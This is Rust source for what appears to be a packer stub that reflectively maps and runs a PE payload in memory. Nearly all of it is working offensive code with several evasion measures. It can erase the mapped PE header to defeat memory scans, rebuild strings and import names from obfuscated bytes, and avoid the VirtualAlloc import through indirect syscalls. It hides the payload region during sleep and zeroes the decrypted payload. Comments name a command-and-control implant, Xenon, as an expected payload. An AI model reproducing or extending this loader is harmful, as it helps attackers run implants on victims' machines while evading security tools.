// --- Reflective loading (technique fragment) ---

use std::ffi::c_void;
use std::ptr;
use std::sync::atomic::{AtomicBool, AtomicI32, AtomicU32, AtomicUsize, Ordering};

use windows::Win32::Foundation::{BOOL, HANDLE, HINSTANCE};
use windows::Win32::System::Diagnostics::Debug::{
    IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_DIRECTORY_ENTRY_IMPORT,
    IMAGE_DIRECTORY_ENTRY_TLS, IMAGE_FILE_DLL, IMAGE_SECTION_HEADER,
};
use windows::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READONLY,
    PAGE_READWRITE,
};
use windows::Win32::System::SystemServices::{
    DLL_PROCESS_ATTACH, IMAGE_BASE_RELOCATION, IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE,
    IMAGE_NT_SIGNATURE, IMAGE_REL_BASED_DIR64, IMAGE_REL_BASED_HIGH, IMAGE_REL_BASED_HIGHLOW,
    IMAGE_REL_BASED_LOW, PIMAGE_TLS_CALLBACK,
};
use windows::Win32::System::Threading::{
    ConvertFiberToThread, ConvertThreadToFiber, CreateFiberEx, DeleteFiber, ExitProcess, ExitThread,
    GetCurrentProcess, GetCurrentProcessId, GetCurrentThreadId, GetProcessId, SwitchToFiber,
    TerminateProcess,
};
use windows::Win32::System::WindowsProgramming::FIBER_FLAG_FLOAT_SWITCH;

/// Entry point signature of a mapped EXE (returns the process exit code).
type ExeEntryPoint = unsafe extern "system" fn() -> u32;

/// Entry point signature of a mapped DLL (DllMain).
type DllEntryPoint = unsafe extern "system" fn(HINSTANCE, u32, *mut c_void) -> BOOL;

/// The image's NT headers, for the architecture the stub is built for.
#[cfg(target_arch = "x86_64")]
type NtHeaders = windows::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64;
#[cfg(target_arch = "x86")]
type NtHeaders = windows::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS32;

/// The optional-header magic the payload must have: PE32+ for an x64 stub,
/// PE32 for an x86 one (the packer enforces the same rule at build time).
#[cfg(target_arch = "x86_64")]
const EXPECTED_MAGIC: u16 = 0x20b;
#[cfg(target_arch = "x86")]
const EXPECTED_MAGIC: u16 = 0x10b;

/// Whether to zero the mapped image's PE header before any payload code runs
/// (`params.erase_header`), so a memory scan does not find an `MZ`/`PE` pair at
/// the mapped base. Substituted at build time by `Params::render_fragment`.
const ERASE_HEADER: bool = $ERASE_HEADER$;

/// Whether to intercept the payload's `ExitProcess`/`ExitThread` imports and run
/// the payload on a fiber (`params.patch_exit`), so its exit hands the thread
/// back to the loader instead of ending the process. Substituted at build time
/// by `Params::render_fragment`.
const PATCH_EXIT: bool = $PATCH_EXIT$;

/// The loader's thread, recorded for the whole load while `patch_exit` is on.
/// The exit shim uses it to tell the loader's thread (whose payload runs on a
/// fiber) from a thread the payload created itself.
static LOADER_THREAD: AtomicU32 = AtomicU32::new(0);
/// The loader's fiber while the payload runs; zero outside that window.
static LOADER_FIBER: AtomicUsize = AtomicUsize::new(0);
/// Whether the payload left through the exit shim rather than returning.
static EXIT_INTERCEPTED: AtomicBool = AtomicBool::new(false);
/// The code an intercepted exit carried.
static EXIT_CODE: AtomicI32 = AtomicI32::new(0);

/// `IMAGE_TLS_DIRECTORY` for the stub's architecture. The 32-bit layout is
/// defined by hand: the `windows` crate only exposes the 64-bit one, and the
/// field names match it so the callback walk stays shared.
#[cfg(target_arch = "x86_64")]
type TlsDirectory = windows::Win32::System::SystemServices::IMAGE_TLS_DIRECTORY64;
#[cfg(target_arch = "x86")]
#[repr(C)]
#[allow(non_snake_case)]
struct TlsDirectory {
    StartAddressOfRawData: u32,
    EndAddressOfRawData: u32,
    AddressOfIndex: u32,
    AddressOfCallBacks: u32,
    SizeOfZeroFill: u32,
    Characteristics: u32,
}
/// Appends the NTSTATUS to a label (which is rebuilt from obfuscated bytes at
/// the call site, so this literal carries no diagnostic text).
fn nt_error(label: String, status: i32) -> String {
    format!("{label} (0x{:08x})", status as u32)
}

/// Appends a section name to a label (rebuilt from obfuscated bytes at the call
/// site, so this literal carries no diagnostic text).
fn section_error(label: String, section: &str) -> String {
    format!("{label}: {section}")
}

/// State shared between the loader fiber and the payload fiber (`patch_exit`).
///
/// It lives in the loader's *stack* frame on purpose: the hand-off does not
/// depend on the heap, and the mapped payload image can never overlap it.
struct FiberContext {
    /// The payload entry to run: an executable entry point or a resolved DLL
    /// export, both already inside the mapped image.
    entry: usize,
    /// `true` when `entry` is an export (`fn()`); `false` for an executable entry
    /// point (`fn() -> u32`).
    export: bool,
    /// The fiber this thread was converted from; the payload fiber switches back
    /// to it when the payload returns.
    loader: usize,
    /// The payload's return value, captured before the switch back.
    code: i32,
}

/// Fiber start routine: runs the payload and schedules the loader fiber again.
///
/// A fiber function that *returns* ends the thread with it, so this routine
/// never returns: the explicit switch back is what makes the payload call a
/// *returning* one (see `run_on_fiber`).
unsafe extern "system" fn payload_fiber(parameter: *mut c_void) {
    // SAFETY: `parameter` is the `&mut FiberContext` the loader passed to
    // `CreateFiberEx`. The loader's frame outlives this fiber: it only deletes
    // the fiber after this routine has scheduled it back.
    let context = unsafe { &mut *(parameter as *mut FiberContext) };
    let code = if context.export {
        // SAFETY: `entry` is an export resolved inside the mapped image.
        let entry: unsafe extern "system" fn() = unsafe { std::mem::transmute(context.entry) };
        unsafe { entry() };
        0
    } else {
        // SAFETY: `entry` is `image_base + AddressOfEntryPoint`.
        let entry: ExeEntryPoint = unsafe { std::mem::transmute(context.entry) };
        unsafe { entry() as i32 }
    };
    context.code = code;
    // SAFETY: `loader` is the fiber this thread was converted from, so switching
    // to it resumes `run_on_fiber` right after its `SwitchToFiber` call. This
    // fiber is deleted there.
    unsafe { SwitchToFiber(context.loader as *const c_void) };
    // Not reached: the loader deletes the fiber instead of resuming it.
}

/// Runs a payload entry on a fiber (`patch_exit`), so an `ExitProcess` or
/// `ExitThread` call from the payload can hand the thread back to the loader
/// instead of ending the process.
///
/// Returns the entry point's return value, or the code an intercepted exit
/// carried. `entry` is an executable entry point when `export` is `false`, and a
/// resolved DLL export when it is `true`.
fn run_on_fiber(entry: usize, export: bool) -> Result<i32, String> {
    // SAFETY: documented kernel32 fiber APIs; every failure path releases the
    // thread conversion before returning, and the context lives in this frame.
    unsafe {
        let loader = ConvertThreadToFiber(None);
        if loader.is_null() {
            return Err($MSG_FIBER_CONVERT_FAILED$);
        }

        let mut context = FiberContext {
            entry,
            export,
            loader: loader as usize,
            code: 0,
        };
        // `FIBER_FLAG_FLOAT_SWITCH`: on x86 the floating-point state is not
        // switched without it, so the payload's FP use would corrupt the
        // loader's state (on x64 the state is part of the fiber context anyway).
        let fiber = CreateFiberEx(
            0,
            0,
            FIBER_FLAG_FLOAT_SWITCH,
            Some(payload_fiber),
            Some(&mut context as *mut FiberContext as *const c_void),
        );
        if fiber.is_null() {
            let _ = ConvertFiberToThread();
            return Err($MSG_FIBER_CREATE_FAILED$);
        }

        EXIT_INTERCEPTED.store(false, Ordering::SeqCst);
        EXIT_CODE.store(0, Ordering::SeqCst);
        LOADER_FIBER.store(loader as usize, Ordering::SeqCst);

        // Returns when the payload fiber schedules the loader again: either the
        // payload returned or its exit call went through `exit_shim`.
        SwitchToFiber(fiber as *const c_void);

        // Close the hand-off window before any loader code runs again, so a late
        // exit call from a payload thread cannot target a deleted fiber.
        LOADER_FIBER.store(0, Ordering::SeqCst);

        // Order matters: `ConvertFiberToThread` releases the thread's fiber
        // state and no fiber call may follow it, so the payload fiber (suspended
        // inside its switch back) is deleted first.
        DeleteFiber(fiber as *const c_void);
        let _ = ConvertFiberToThread();

        if EXIT_INTERCEPTED.load(Ordering::SeqCst) {
            Ok(EXIT_CODE.load(Ordering::SeqCst))
        } else {
            Ok(context.code)
        }
    }
}

/// A base relocation entry (type + offset packed in a `u16`).
#[repr(C)]
struct BaseRelocationEntry {
    data: u16,
}

impl BaseRelocationEntry {
    fn offset(&self) -> u16 {
        self.data & 0x0FFF
    }

    fn type_(&self) -> u16 {
        self.data >> 12
    }
}

/// Reflectively loads `payload` in the current process and returns the exit
/// code of its entry point.
///
/// When `export` is set (`build.payloads.<name>.export`, only meaningful for
/// `format: dll`), that exported function is called instead of the image's
/// entry point: a mapped DLL's `DllMain` only initializes the library, so a
/// named export is how a DLL payload does real work.
///
/// # Safety
/// `payload` must hold a valid, readable PE image for the stub's architecture.
/// The loader reads it until it has mapped the image and resolved the export;
/// on the export path it zeroes the buffer before calling the export, which
/// runs from the mapped copy. The payload is executed in-process, so its code
/// runs with the stub's privileges.
pub unsafe fn run_reflective(
    payload: &mut [u8],
    export: Option<&str>,
) -> Result<i32, String> {
    let (_dos, nt) = get_headers(payload)?;
    let is_dll = (*nt).FileHeader.Characteristics.0 & IMAGE_FILE_DLL.0 != 0;
    if PATCH_EXIT {
        // Recorded before the IAT patch below makes the exit shim reachable, so
        // a TLS callback that exits is already classified correctly.
        LOADER_THREAD.store(GetCurrentThreadId(), Ordering::SeqCst);
    }
    crate::tech_dbg!(
        "reflective_loading",
        "payload {} bytes (dll={is_dll})",
        payload.len()
    );

    let image_base = allocate_image(nt)?;
    crate::tech_dbg!("reflective_loading", "image mapped at {image_base:p}");
    // Record the mapped image for runtime hooks (the `Sleep` proxy conceals it
    // while the payload sleeps). `SizeOfImage` covers every section; the record
    // is taken before any step could erase the mapped headers.
    crate::payload_region::set(
        image_base as usize,
        (*nt).OptionalHeader.SizeOfImage as usize,
    );
    copy_headers(payload, image_base, nt)?;
    copy_sections(payload, image_base, nt)?;
    crate::tech_dbg!("reflective_loading", "headers and sections copied");
    fix_imports(image_base, nt)?;
    fix_relocations(image_base, nt)?;
    crate::tech_dbg!("reflective_loading", "relocations applied");
    fix_memory_protections(image_base, nt)?;
    crate::tech_dbg!("reflective_loading", "section protections applied");

    // From here on the payload's own code runs (TLS callbacks, `DllMain`, the
    // export or the entry point). Each payload call runs paused: payload code
    // must run on the array its own threads will see, and a payload that loads
    // a module with static TLS makes the loader grow the per-thread array (a
    // shellcode stub's private array would crash it). The guards never span a
    // `tech_dbg!` print — a debug stub prints on its own TLS, never paused —
    // and a payload that blocks in its export keeps the paused state for its
    // whole lifetime.

    {
        let _handoff = crate::tls_handoff::PauseGuard::enter();
        // The payload's `DLL_PROCESS_ATTACH` callbacks initialize its global
        // state, which is all this mapper can offer: it does not provision the
        // per-thread TLS a manually mapped image has no index for (see
        // `run_tls_callbacks`). A malformed TLS directory fails the load here,
        // before any payload code runs.
        run_tls_callbacks(image_base, nt)?;
    }
    crate::tech_dbg!("reflective_loading", "TLS callbacks executed");

    // Opt-in and last among the loader's own steps: zero the mapped image's PE
    // header before any payload code runs (entry point, `DllMain` or export).
    // Export resolution below reads the payload buffer's header (`nt`) and the
    // export tables inside a section, never the mapped header, so the export
    // path is covered too.
    if ERASE_HEADER {
        erase_mapped_header(image_base, nt);
        crate::tech_dbg!("reflective_loading", "mapped PE header erased");
    }

    if let Some(name) = export {
        // Initialize the library first: a mapped DLL's CRT/global constructors
        // run from `DllMain(DLL_PROCESS_ATTACH)`, which the OS loader would
        // normally call. Skipping it leaves an export that touches the CRT
        // running against uninitialized state.
        if is_dll {
            crate::tech_dbg!("reflective_loading", "running DllMain(DLL_PROCESS_ATTACH)");
            let _handoff = crate::tls_handoff::PauseGuard::enter();
            call_dll_main(image_base, nt);
        }
        let address = resolve_export(image_base, nt, name)?;
        // Last read of the buffer: `resolve_export` returns `base + rva`, an
        // address inside the mapped image, not a pointer into `payload`. The
        // loader does not own the buffer, so it cannot free it, and the export
        // may block for hours (Xenon's `DllRegisterServer` sleeps 24h): zeroing
        // drops the pristine decrypted DLL without keeping it alive for that
        // lifetime. This must stay after every step that reads `nt`: the TLS
        // callbacks, `DllMain`, `erase_mapped_header` and `resolve_export`.
        payload.fill(0);
        crate::tech_dbg!("reflective_loading", "calling export '{name}' at 0x{address:x}");
        {
            let _handoff = crate::tls_handoff::PauseGuard::enter();
            if PATCH_EXIT {
                // An export can exit too; a fiber makes that a hand-off instead
                // of a process teardown. The export's value is not the step's.
                run_on_fiber(address, true)?;
            } else {
                call_export(address);
            }
        }
        // The payload is back: report the runtime hook's work on the loader's
        // thread, where the debug stub's TLS is provisioned (the proxy itself
        // must never trace).
        crate::tech_dbg!(
            "reflective_loading",
            "sleep-hook conceals completed: {}",
            crate::payload_region::conceals()
        );
        return Ok(0);
    }

    let code = {
        let _handoff = crate::tls_handoff::PauseGuard::enter();
        execute_entrypoint(image_base, nt, is_dll)
    };
    crate::tech_dbg!(
        "reflective_loading",
        "sleep-hook conceals completed: {}",
        crate::payload_region::conceals()
    );
    code
}

/// Validates the image and returns pointers to its DOS and NT headers.
///
/// Everything the later steps index into is checked here, because they walk the
/// *file* buffer (`copy_headers`, `copy_sections`) and the *mapped* image
/// (`copy_sections`, the entry point) without re-reading the size fields: an
/// image whose headers do not fit, or whose size fields are inconsistent, is
/// rejected before a byte is copied or a page is committed.
fn get_headers(
    payload: &[u8],
) -> Result<(*const IMAGE_DOS_HEADER, *const NtHeaders), String> {
    if payload.len() < std::mem::size_of::<IMAGE_DOS_HEADER>() {
        return Err($MSG_FILE_TOO_SMALL$);
    }

    unsafe {
        let dos = payload.as_ptr() as *const IMAGE_DOS_HEADER;
        if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
            return Err($MSG_INVALID_DOS$);
        }

        // The NT headers must fit in the buffer *before* they are dereferenced.
        let nt_offset = (*dos).e_lfanew as usize;
        let section_table = nt_offset
            .checked_add(std::mem::size_of::<NtHeaders>())
            .ok_or_else(|| $MSG_HEADERS_OUT_OF_BOUNDS$)?;
        if section_table > payload.len() {
            return Err($MSG_HEADERS_OUT_OF_BOUNDS$);
        }

        let nt = payload.as_ptr().add(nt_offset) as *const NtHeaders;
        if (*nt).Signature != IMAGE_NT_SIGNATURE {
            return Err($MSG_INVALID_NT$);
        }

        // The packer already rejects a payload whose arch differs from
        // `build.output.arch`, but keep a defensive check here.
        let magic = (*nt).OptionalHeader.Magic.0;
        if magic != EXPECTED_MAGIC {
            return Err(format!("{} (magic 0x{magic:04x})", $MSG_UNSUPPORTED_ARCH$));
        }

        // `copy_headers` copies `SizeOfHeaders` bytes from the buffer into the
        // mapped image, so both have to be big enough for them.
        let size_of_image = (*nt).OptionalHeader.SizeOfImage as usize;
        let size_of_headers = (*nt).OptionalHeader.SizeOfHeaders as usize;
        if size_of_image == 0 || size_of_headers > size_of_image || size_of_headers > payload.len() {
            return Err($MSG_IMAGE_SIZE_INVALID$);
        }

        // The section headers follow the NT headers; `copy_sections` walks all of
        // them, so the whole table must be inside the buffer.
        let table_len =
            (*nt).FileHeader.NumberOfSections as usize * std::mem::size_of::<IMAGE_SECTION_HEADER>();
        let table_end = section_table
            .checked_add(table_len)
            .ok_or_else(|| $MSG_HEADERS_OUT_OF_BOUNDS$)?;
        if table_end > payload.len() {
            return Err($MSG_HEADERS_OUT_OF_BOUNDS$);
        }

        // An entry point that is outside the image addresses memory the payload
        // does not own. Zero is legal for a DLL (no entry point); an executable
        // with a zero entry point is refused when it runs (`execute_entrypoint`).
        let entry_point = (*nt).OptionalHeader.AddressOfEntryPoint as usize;
        if entry_point != 0 && entry_point >= size_of_image {
            return Err($MSG_ENTRY_POINT_OUT_OF_BOUNDS$);
        }

        Ok((dos, nt))
    }
}

/// Allocates the image at its preferred base (falling back to any address).
/// The allocation goes through the syscall layer's `nt_alloc_vm`, so
/// `mode: indirect` removes the `VirtualAlloc` import.
fn allocate_image(nt: *const NtHeaders) -> Result<*mut c_void, String> {
    unsafe {
        let size = (*nt).OptionalHeader.SizeOfImage as usize;
        let preferred = (*nt).OptionalHeader.ImageBase as usize;

        let process = GetCurrentProcess();
        let mut base = preferred as *mut c_void;
        let mut region = size;
        let mut status = crate::nt_alloc_vm(
            process,
            &mut base,
            0,
            &mut region,
            MEM_COMMIT.0 | MEM_RESERVE.0,
            PAGE_READWRITE.0,
        );
        if status < 0 {
            base = ptr::null_mut();
            region = size;
            status = crate::nt_alloc_vm(
                process,
                &mut base,
                0,
                &mut region,
                MEM_COMMIT.0 | MEM_RESERVE.0,
                PAGE_READWRITE.0,
            );
        }
        if status < 0 {
            return Err(nt_error($MSG_ALLOCATE_FAILED$, status));
        }

        Ok(base)
    }
}

/// Copies the `SizeOfHeaders` bytes at the start of the buffer into the mapped
/// image. `get_headers` validated that length against both the buffer and
/// `SizeOfImage`, so the copy cannot run past either.
fn copy_headers(
    payload: &[u8],
    image_base: *mut c_void,
    nt: *const NtHeaders,
) -> Result<(), String> {
    unsafe {
        let size = (*nt).OptionalHeader.SizeOfHeaders as usize;
        ptr::copy_nonoverlapping(payload.as_ptr(), image_base as *mut u8, size);
    }
    Ok(())
}

/// Zeroes the mapped image's PE header (`SizeOfHeaders` bytes at its base).
///
/// The loader reads every later step's metadata from the payload buffer (`nt`),
/// not from the mapped copy, and `copy_headers` left the header pages writable
/// (they are covered by no section, so `fix_memory_protections` never touched
/// them) — a plain `write_bytes` needs no protection change. A payload whose
/// own startup code reads its image's PE header (for example the MSVC CRT) can
/// break, which is why `params.erase_header` is opt-in.
fn erase_mapped_header(image_base: *mut c_void, nt: *const NtHeaders) {
    unsafe {
        let size = (*nt).OptionalHeader.SizeOfHeaders as usize;
        if size > 0 {
            // SAFETY: `image_base` is the image allocated by `allocate_image`
            // and `copy_headers` left the first `SizeOfHeaders` bytes writable.
            ptr::write_bytes(image_base as *mut u8, 0, size);
        }
    }
}

/// Copies each section's raw data into the mapped image.
///
/// Both ends are checked: the source against the *file* buffer (a truncated
/// payload) and the destination against `SizeOfImage` (a section that claims to
/// live past the image would otherwise be written over whatever follows the
/// allocation). The arithmetic is checked as well, since a malformed section can
/// wrap the sum instead of failing the comparison.
fn copy_sections(
    payload: &[u8],
    image_base: *mut c_void,
    nt: *const NtHeaders,
) -> Result<(), String> {
    unsafe {
        let section_header = (nt as usize + std::mem::size_of::<NtHeaders>())
            as *const IMAGE_SECTION_HEADER;
        let num = (*nt).FileHeader.NumberOfSections as usize;
        let size_of_image = (*nt).OptionalHeader.SizeOfImage as usize;

        for i in 0..num {
            let section = section_header.add(i);
            let raw_size = (*section).SizeOfRawData as usize;
            if raw_size == 0 {
                continue;
            }

            let src = (*section).PointerToRawData as usize;
            let dst = (*section).VirtualAddress as usize;
            let src_end = src
                .checked_add(raw_size)
                .ok_or_else(|| section_error($MSG_SECTION_OUT_OF_BOUNDS$, &section_name(section)))?;
            if src_end > payload.len() {
                return Err(section_error(
                    $MSG_SECTION_OUT_OF_BOUNDS$,
                    &section_name(section),
                ));
            }
            let dst_end = dst
                .checked_add(raw_size)
                .ok_or_else(|| section_error($MSG_SECTION_OUT_OF_IMAGE$, &section_name(section)))?;
            if dst_end > size_of_image {
                return Err(section_error(
                    $MSG_SECTION_OUT_OF_IMAGE$,
                    &section_name(section),
                ));
            }
            ptr::copy_nonoverlapping(
                payload.as_ptr().add(src),
                (image_base as usize + dst) as *mut u8,
                raw_size,
            );
        }
    }
    Ok(())
}

/// Reads a section's (not necessarily NUL-terminated) name.
unsafe fn section_name(section: *const IMAGE_SECTION_HEADER) -> String {
    let name = &(*section).Name;
    let end = name.iter().position(|&b| b == 0).unwrap_or(name.len());
    String::from_utf8_lossy(&name[..end]).into_owned()
}

/// Hands the calling payload thread back to the loader, with `code` as the
/// step's exit code.
///
/// On the loader's thread the payload runs on a fiber, so the code is recorded
/// and the shim switches back to the loader instead of tearing the process down.
/// On a thread the payload created there is no fiber to switch to: `ExitThread`
/// ends just that thread and the process survives. Outside the fiber window (a
/// TLS callback or `DllMain` that exits) the loader cannot resume its flow, so
/// the real `ExitProcess` runs as before.
///
/// # Safety
/// Must only be called from an intercepted exit shim.
unsafe fn hand_off(code: u32) -> ! {
    let thread = GetCurrentThreadId();
    let loader = LOADER_FIBER.load(Ordering::SeqCst);
    if loader != 0 && thread == LOADER_THREAD.load(Ordering::SeqCst) {
        EXIT_CODE.store(code as i32, Ordering::SeqCst);
        EXIT_INTERCEPTED.store(true, Ordering::SeqCst);
        // SAFETY: `loader` is the fiber this thread was converted from and is
        // still alive: `run_on_fiber` deletes the payload fiber only after the
        // switch returns.
        unsafe { SwitchToFiber(loader as *const c_void) };
        // Not reached: the loader deletes this fiber instead of resuming it. If
        // it ever were resumed, ending the process is the honest fallback.
        unsafe { ExitProcess(code) }
    }
    if thread != LOADER_THREAD.load(Ordering::SeqCst) {
        // A payload-created thread is not a fiber; ending it leaves the loader's
        // thread (and the chain) alive.
        unsafe { ExitThread(code) }
    }
    // The loader's thread outside the fiber window: the old behavior.
    unsafe { ExitProcess(code) }
}

/// `ExitProcess`/`ExitThread` shim (`extern "system"`, one `u32`).
///
/// # Safety
/// Only reachable as an IAT entry of the mapped payload image.
unsafe extern "system" fn exit_shim(code: u32) -> ! {
    unsafe { hand_off(code) }
}

/// C runtime `exit`/`_exit` shim (`extern "C"`: cdecl on x86, unlike the Win32
/// exports above). The payload's CRT calls `exit` at the end of `mainCRTStartup`
/// and on `sys.exit`, so intercepting it is what makes a normal C/C++/Python
/// executable hand control back.
///
/// # Safety
/// Only reachable as an IAT entry of the mapped payload image.
unsafe extern "C" fn crt_exit_shim(code: i32) -> ! {
    unsafe { hand_off(code as u32) }
}

/// `TerminateProcess` shim (`extern "system"`, handle + code). Nuitka/PyInstaller
/// and some runtimes end through this call instead of `ExitProcess`.
///
/// Only a call that targets *this* process is a hand-off; a payload that
/// terminates another process gets the real export.
///
/// # Safety
/// Only reachable as an IAT entry of the mapped payload image.
unsafe extern "system" fn terminate_shim(process: HANDLE, code: u32) -> BOOL {
    if terminates_self(process) {
        unsafe { hand_off(code) }
    }
    // Another process: forward to the real export and preserve BOOL semantics
    // (the `windows` wrapper turns the BOOL into a `Result`).
    match unsafe { TerminateProcess(process, code) } {
        Ok(()) => BOOL(1),
        Err(_) => BOOL(0),
    }
}

/// Whether `process` names the current process.
fn terminates_self(process: HANDLE) -> bool {
    unsafe {
        process == GetCurrentProcess()
            || GetProcessId(process) == GetCurrentProcessId()
    }
}

/// The shim that serves an intercepted exit import, if any.
///
/// Every name is rebuilt from obfuscated bytes at the call site, so none lands
/// in the stub's `.rdata`.
fn exit_proxy(func: &str) -> Option<u64> {
    if !PATCH_EXIT {
        return None;
    }
    let process: String = $EXIT_PROCESS_DEF$;
    if func == process.as_str() {
        return Some(exit_shim as usize as u64);
    }
    let thread: String = $EXIT_THREAD_DEF$;
    if func == thread.as_str() {
        return Some(exit_shim as usize as u64);
    }
    let crt: String = $EXIT_DEF$;
    if func == crt.as_str() {
        return Some(crt_exit_shim as usize as u64);
    }
    let crt_fast: String = $UNDERSCORE_EXIT_DEF$;
    if func == crt_fast.as_str() {
        return Some(crt_exit_shim as usize as u64);
    }
    let terminate: String = $TERMINATE_PROCESS_DEF$;
    if func == terminate.as_str() {
        return Some(terminate_shim as usize as u64);
    }
    None
}

fn fix_imports(
    image_base: *mut c_void,
    nt: *const NtHeaders,
) -> Result<(), String> {
    unsafe {
        let import_dir =
            (*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT.0 as usize];
        if import_dir.Size == 0 || import_dir.VirtualAddress == 0 {
            return Ok(());
        }

        // The mapped image has RVA == offset from `image_base`. `patch_imports`
        // resolves the table, serves catalogue hits from `resolution_policy`,
        // and makes the IAT writable only while it writes (the loader maps it
        // read-only). With `patch_exit` the payload's exit calls are redirected
        // to the shims first; every other import keeps the build's policy.
        let view = std::slice::from_raw_parts_mut(
            image_base as *mut u8,
            (*nt).OptionalHeader.SizeOfImage as usize,
        );
        let count = crate::patch_imports(
            view,
            import_dir.VirtualAddress,
            import_dir.Size,
            |dll: &str, func: &str| match exit_proxy(func) {
                Some(proxy) => crate::ImportPolicy::Proxy(proxy),
                None => crate::resolution_policy(dll, func),
            },
        )
        .map_err(|e| e.to_string())?;
        crate::tech_dbg!("reflective_loading", "IAT patched ({count} import(s))");
    }
    Ok(())
}

/// Whether a relocation's fixup target stays inside the image.
///
/// The target is the block's page RVA plus the entry's offset, and the fixup
/// writes `width` bytes there. Both the page RVA and the offset are payload
/// controlled, so the sum has to be checked (and then bounded against
/// `SizeOfImage`) before the mapper writes through it.
fn reloc_target_in_image(page_rva: u32, offset: u16, width: usize, size_of_image: usize) -> bool {
    (page_rva as usize)
        .checked_add(offset as usize)
        .and_then(|target| target.checked_add(width))
        .map(|end| end <= size_of_image)
        .unwrap_or(false)
}

/// Applies the image's base relocations when it did not land at its preferred
/// base.
///
/// Landing away from the preferred base is only fixable with relocations: without
/// them every absolute address in the image still points at the preferred base,
/// so the load fails here — with a diagnostic — instead of faulting later inside
/// the payload. Every block header and every fixup target is checked against the
/// directory and `SizeOfImage` before it is dereferenced or written.
fn fix_relocations(
    image_base: *mut c_void,
    nt: *const NtHeaders,
) -> Result<(), String> {
    unsafe {
        let preferred = (*nt).OptionalHeader.ImageBase as isize;
        let delta = image_base as isize - preferred;
        if delta == 0 {
            return Ok(());
        }

        let reloc_dir =
            (*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC.0 as usize];
        if reloc_dir.Size == 0 || reloc_dir.VirtualAddress == 0 {
            return Err($MSG_NO_RELOCATIONS$);
        }

        // The directory has to be inside the image before the first block is
        // dereferenced, and the walk below stops at `dir_end` as well as at a
        // zero block: every header is checked before its fields are trusted.
        let size_of_image = (*nt).OptionalHeader.SizeOfImage as usize;
        let dir_start = reloc_dir.VirtualAddress as usize;
        let header_size = std::mem::size_of::<IMAGE_BASE_RELOCATION>();
        let dir_end = dir_start
            .checked_add(reloc_dir.Size as usize)
            .ok_or_else(|| $MSG_RELOCATIONS_OUT_OF_IMAGE$)?;
        // A directory too small to hold one block header cannot be walked; the
        // image needs its relocations, so an empty table is not an option.
        if dir_end > size_of_image || (reloc_dir.Size as usize) < header_size {
            return Err($MSG_RELOCATIONS_OUT_OF_IMAGE$);
        }
        let image_start = image_base as usize;

        let mut block_rva = dir_start;
        loop {
            // The block header is read before its fields are trusted, so it has
            // to fit in the directory first. A directory that ends without a
            // zero terminator is legal (the linker only has to stay within
            // `Size`), so running out of room ends the walk instead of reading
            // past the directory.
            let Some(header_end) = block_rva.checked_add(header_size) else {
                return Err($MSG_RELOCATIONS_OUT_OF_IMAGE$);
            };
            if header_end > dir_end {
                break;
            }

            let block = (image_start + block_rva) as *const IMAGE_BASE_RELOCATION;
            let page_rva = (*block).VirtualAddress;
            if page_rva == 0 {
                break;
            }
            let block_size = (*block).SizeOfBlock as usize;
            // A block that is too small to hold its own header would underflow
            // `count` below, and one that runs past the directory would read
            // whatever follows it.
            let block_end = block_rva
                .checked_add(block_size)
                .ok_or_else(|| $MSG_RELOCATIONS_OUT_OF_IMAGE$)?;
            if block_size < header_size || block_end > dir_end {
                return Err($MSG_RELOCATIONS_OUT_OF_IMAGE$);
            }
            let count = (block_size - header_size) / std::mem::size_of::<u16>();
            let entries = (block as usize + header_size) as *const BaseRelocationEntry;

            for i in 0..count {
                let entry = entries.add(i);
                let kind = (*entry).type_() as u32;
                let offset = (*entry).offset();
                // The width of the value a fixup writes; `ABSOLUTE` (and any
                // type this mapper does not know) writes nothing and needs no
                // target.
                let width = match kind {
                    IMAGE_REL_BASED_DIR64 => std::mem::size_of::<u64>(),
                    IMAGE_REL_BASED_HIGHLOW => std::mem::size_of::<u32>(),
                    IMAGE_REL_BASED_HIGH | IMAGE_REL_BASED_LOW => std::mem::size_of::<u16>(),
                    _ => 0,
                };
                if width == 0 {
                    continue;
                }
                // A page RVA near the end of the address space would otherwise
                // write far outside the mapped image.
                if !reloc_target_in_image(page_rva, offset, width, size_of_image) {
                    return Err($MSG_RELOCATIONS_OUT_OF_IMAGE$);
                }

                let target = (image_start + page_rva as usize + offset as usize) as *mut isize;
                match kind {
                    IMAGE_REL_BASED_DIR64 => {
                        *target += delta;
                    }
                    IMAGE_REL_BASED_HIGHLOW => {
                        let target32 = target as *mut u32;
                        *target32 = (*target32 as isize + delta) as u32;
                    }
                    IMAGE_REL_BASED_HIGH => {
                        let target16 = target as *mut u16;
                        *target16 = (*target16 as isize + (delta >> 16)) as u16;
                    }
                    IMAGE_REL_BASED_LOW => {
                        let target16 = target as *mut u16;
                        *target16 = (*target16 as isize + (delta & 0xFFFF)) as u16;
                    }
                    _ => {}
                }
            }

            block_rva = block_end;
        }
    }
    Ok(())
}

fn fix_memory_protections(
    image_base: *mut c_void,
    nt: *const NtHeaders,
) -> Result<(), String> {
    unsafe {
        let section_header = (nt as usize + std::mem::size_of::<NtHeaders>())
            as *const IMAGE_SECTION_HEADER;
        let num = (*nt).FileHeader.NumberOfSections as usize;

        for i in 0..num {
            let section = section_header.add(i);
            let characteristics = (*section).Characteristics.0;
            let protection = if characteristics & 0x2000_0000 != 0 {
                // IMAGE_SCN_MEM_EXECUTE
                if characteristics & 0x8000_0000 != 0 {
                    PAGE_EXECUTE_READWRITE
                } else {
                    PAGE_EXECUTE_READ
                }
            } else if characteristics & 0x8000_0000 != 0 {
                PAGE_READWRITE
            } else {
                PAGE_READONLY
            };

            let address =
                (image_base as usize + (*section).VirtualAddress as usize) as *const c_void;
            let size = (*section).Misc.VirtualSize as usize;
            if size > 0 {
                let mut old = 0u32;
                let status = crate::nt_protect_vm(
                    GetCurrentProcess(),
                    address as *mut core::ffi::c_void,
                    size,
                    protection.0,
                    &mut old,
                );
                if status < 0 {
                    return Err(format!(
                        "{}: {} (0x{:08x})",
                        $MSG_VIRTUAL_PROTECT_FAILED$,
                        section_name(section),
                        status as u32
                    ));
                }
            }
        }
    }
    Ok(())
}


